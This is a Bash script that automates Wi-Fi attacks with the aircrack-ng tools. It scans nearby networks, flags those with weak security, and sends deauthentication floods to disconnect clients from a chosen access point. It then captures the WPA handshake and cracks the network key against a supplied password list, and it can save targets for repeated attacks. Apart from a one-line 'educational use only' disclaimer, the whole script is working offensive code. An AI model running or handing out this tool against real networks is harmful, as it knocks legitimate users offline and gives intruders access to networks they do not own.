#!/bin/bash

# interfaces
interface=wlp8s0
interfaceMon=wlp8s0mon
filePath=
monitorMode=
# color
green=`tput setaf 2`
red=`tput setaf 1`
yellow=`tput setaf 11`
reset=`tput sgr0`
scanTime=10s

# help
showHelp() {
	echo ""
	echo "Usage: ./aircrack.sh <options>"
	echo ""
	echo "NB: Script requires root privileges!"
	echo ""
	echo "Options:"
	echo " -i <interface>: Wireless network interface to use. Default is wlp8s0."
	echo " -f <password file>: Path to password file for cracking network key."
	echo " -v: Verbose mode. Print out debug information, must be the last flag."
	echo " -h: show help"
	echo ""
	exit
}

setInterface() {
	interface=$1

	isMon=$(echo $interface | grep "mon" | wc -l)

	if [ "$isMon" == "0" ]; then
		interfaceMon="${interface}mon"
	else
		interfaceMon=$interface
	fi
}

verbose() {
	echo "--- DEBUG INFO ---"
	echo "User: $USER"
	echo "Interface: $interface"
	echo "Interface mon: $interfaceMon"
	echo "Password list path: $filePath"
	echo "Default scan time: $scanTime"
	echo ""
}

while getopts 'hvi:f:' flag; do
  case "${flag}" in
  	h) showHelp ;;
		v) verbose ;;
    i) setInterface "${OPTARG}";;
	  f) filePath="${OPTARG}" ;;
    *) interface=wlp8s0
  esac
done

# check root permissions
if [ "$EUID" -ne 0 ];then 
	echo "${red}ERROR: Run this script as root!"
 	exit
fi

# Check if interface exist
checkInterface=$(sudo airmon-ng | grep -wE "$interface|$interfaceMon" | wc -l)

if [ "$checkInterface" == "0" ]
	then
		echo "${red}ERROR: $interface is not a valid network interface!${reset}"
		showHelp
	exit	
fi	

# Welcome text
figlet "Aircrack"
echo "DISCLAIMER: For educational use only. Do NOT use on networks you don't own or have permissions to test!"
echo ""

# Check if interface is in monitor mode
monitorMode=$(sudo airmon-ng | grep -w $interfaceMon | wc -l)
if [ "$monitorMode" == "0" ]
	then
	echo ""
	echo "WARNING: Montior mode is not enabled for $interface"
	read -p 'Enable monitor mode (y/n)? ' option1

	if [ "$option1" == "y" ] || [ "$option1" == "Y" ]
	then
		echo ""
		sudo airmon-ng start $interface
		interfaceMon="${interface}mon"
	fi
else
	echo "${green}MONITOR MODE ENABLED: $interfaceMon${reset}"
fi

# Choose operation
start () {
	echo ""
	echo "-- SELECT AN OPERATION --"
	echo "[1] Start network scan"
	echo "[2] Manuel de-auth attack"
	echo "[3] Disable monitor mode for $interfaceMon"
	echo ""
	read -p 'Select operation [1-3]: ' option2
	echo ""

	if [ "$option2" == "1" ] # auto attack
		then
		sudo rm scan-01.* --force > /dev/null
		echo "-- CHOOSE NETWORK BAND --"
		echo "[1] 2.4 GHz"
		echo "[2] 5 GHz"
		echo ""
		read -p 'Choose network band [1-2]: ' band
		echo ""
		read -p 'Enter scan time in seconds (default is 10): ' time
		echo ""

		if [ "$time" != "" ]; then
			scanTime="${time}s"
		fi

		if [ "$band" == "1" ]; then
			echo "Scanning networks on 2.4GHz for $scanTime..."
			screen -d -m sudo airodump-ng -w scan --output-format csv $interfaceMon
		else	
			echo "Scanning networks on 5GHz for $scanTime..."
			screen -d -m sudo airodump-ng -w scan --output-format csv $interfaceMon -b a
		fi
		sleep $scanTime
		sudo killall screen
		sed -i '1d' scan-01.csv
		sed -i '1d' scan-01.csv
		echo ""
		echo "-- SCAN RESULT --"
		echo ""
		echo "${green}GREEN: OPEN NETWORK${reset}"
		echo "${yellow}YELLOW: WEAK SECURITY (WPA, WPA2, WEP, OPN)${reset}"
		echo "${red}RED: STRONG SECURITY, NOT POSSIBLE TO DE-AUTH (WPA3)${reset}"
		echo ""
		echo "+++: Good signal"
		echo "++: OK signal"
		echo "+: Bad signal"
		echo ""
		i=1
		filename=scan-01.csv
		while read line; do
			stop=$(echo $line | grep "Station MAC" | wc -l)
			if [ "$stop" == "1" ]; then
				# no more networks, exit loop
				break
			fi
			# parse CSV file
			mac=${line:0:17}
			channel=${line:61:2}
			name=${line: -22}
			name=$(echo $name | grep -o '[^\,.]\{4,\}')
			name=$(echo $name | xargs)
			# encryption method
			security=$(echo $line | grep -o 'WPA2\|WPA3\|OPN\|WEP')
			security=${security//$'\n'/}
			# signal
			PWR=${line:80:15}
			PWR=$(echo $PWR | grep -o '[0-9][0-9]')
			PWR=$((PWR*-1))
			signal=
			if [ "$PWR" -ge "-60" ] && [ "$PWR" -lt "0" ]; then
				signal="+++"
			elif [ "$PWR" -lt "-60" ] && [ "$PWR" -gt "-75" ]; then
				signal="++"
			elif [ "$PWR" -le "-75" ]; then
				signal="+"
			else
				signal="NA"
			fi
			if [ "$name" == "" ]; then 
					# Network name is unknown
					name="Hidden network"
			fi
			if [ "$security" = "OPN" ]; then
				# no security
				echo "${green}[$i] $name [Open] [$signal] ($mac) - channel: $channel${reset}"
			elif [ "$security" == "WPA" ] || [ "$security" == "WPA2" ] || [ "$security" == "WEP" ]; then
				# weak security
				echo "${yellow}[$i] $name [$security] [$signal] ($mac) - channel: $channel${reset}"
			else
				# WPA3
				if [ "$security" == "WPA3WPA2" ]; then
					security=WPA3
				fi
				echo "${red}[$i] $name [$security] ($mac) - channel: $channel${reset}"
			fi	
			i=$((i+1))
		done < $filename
		# Choose network
		echo ""
		i=$((i-2))
		read -p "Choose network [1-$i]: " network
		res=$(sed -n $((network))p scan-01.csv)
		ap=${res:0:17}
		channel=${res:61:2}
		name=${res: -22}
		name=$(echo $name | grep -o '[^\,.]\{4,\}')
		security=$(echo $res | grep -o 'WPA2\|WPA3\|OPN\|WEP')
		security=${security//$'\n'/}
		echo ""
		echo "$name [$security] ($ap) - channel: $channel"
		echo ""
		echo "-- SELECT OPERATION --"
		echo "[1] See devices connected to network"
		echo "[2] De-auth devices on network and crack Wi-Fi key"
		echo "[3] Quit"
		echo ""
		read -p "Select operation [1-3]: " choose
		echo ""

		if [ "$choose" == "1" ]; then
			sudo airodump-ng $interfaceMon --bssid $ap --channel $channel -a
		elif [ "$choose" == "2" ]; then
			read -p "De-auth requests (default is 1): " number
			echo ""
			deAuth
		else
			exit
		fi
	elif [ "$option2" == "2" ] # manual attack
		then
		echo ""
		if [ -f "file" ]
			then
			read -p "Load saved targets (y/n)? " load
			echo ""
		fi

	if [ "$load" == "y" ] || [ "$load" == "Y" ]
		then
		currentLine=1
		lines=$(wc -l < file)

		targets=$((lines / 4))

		echo "$targets saved targets"

		for i in $(eval echo "{1..$targets}"); do
			echo ""
			echo "[Target $i]"
			echo "Name: $(sed -n $((currentLine))p file)"
			echo "AP MAC: $(sed -n $((currentLine+1))p file)"
			echo "Client MAC: $(sed -n $((currentLine+2))p file)"
		  echo "Channel: $(sed -n $((currentLine+3))p file)"
		  currentLine=$((currentLine+4))
		done

		echo ""
		read -p "Enter target [1-$targets]: " targ
		targ=$((targ-1))
		currentLine=$((1+($targ*4)))
		name=$(sed -n $((currentLine))p file)
		ap=$(sed -n $((currentLine+1))p file)
		client=$(sed -n $((currentLine+2))p file)
		channel=$(sed -n $((currentLine+3))p file)

		echo ""
		echo "${green}$name ($client) is selected! ${reset}"
	  echo ""
		read -p "De-auth requests (default is 1): " number
		echo ""
		deAuth
	else
		echo "-- New target --"
		read -p "Access point MAC address: " ap
		read -p "Client MAC address (leave empty for every device): " client
		read -p "Channel: " channel
		read -p "De-auth requests (default is 1): " number
		read -p "Save target for later (y/n)? " save

		if [ "$save" == "y" ] || [ "$save" == "Y" ]
			then
			read -p "Name: " name
			printf "$name\n$ap\n$client\n$channel\n" >> file # save to file
		fi

		deAuth
	fi	
	elif [ "$option2" == "3" ]
		then
		echo "Stoppping interface..."
		sudo airmon-ng stop $interfaceMon > /dev/null
		echo "Done."
	fi
}

deAuth () {

	# start interface on channel
	sudo airmon-ng start $interfaceMon $channel > /dev/null

	# if -f flag is specifed ask if password should be cracked
	if [ "$filePath" != "" ]; then
			read -p "Try to crack WiFi password (y/n)? " capture
	else
			echo "${yellow}NOTE: No password file specified. Run ./aircrack.sh -i <pass_list> to perform key attack.${reset}"
			echo ""
	fi

	# default de-auth requests is 1
  if [ "$number" == "" ]; then
  		number=1
  fi

  # start capture for key crack
  if [ "$capture" == "y" ] || [ "$capture" == "Y" ]
  then
  	echo "-- Starting handshake capture --"
  	echo ""
  	sudo rm capture-* --force
  	screen -d -m sudo airodump-ng -d $ap -c $channel -w capture $interfaceMon > /dev/null
  fi

  echo "-- Starting de-auth attack ($number requests) --"
	echo ""

	if [ -z "$client" ]
	then
		sudo aireplay-ng -0 $number -a $ap $interfaceMon
	else
		sudo aireplay-ng -0 $number -a $ap -c $client $interfaceMon
	fi

	# stop capture and crack key
	if [ "$capture" == "y" ] || [ "$capture" == "Y" ]
  then
  	echo ""
  	echo "-- Stopping handshake capture (10s) ---"
  	sleep 10s
		sudo killall screen
		echo ""
		echo "-- Cracking Wi-Fi key --"
  	sudo aircrack-ng capture-01.cap -w $filePath
  fi

	echo ""
	read -p "${green}Attack completed. Press any key to continue...${reset}" blah

	start
}

start
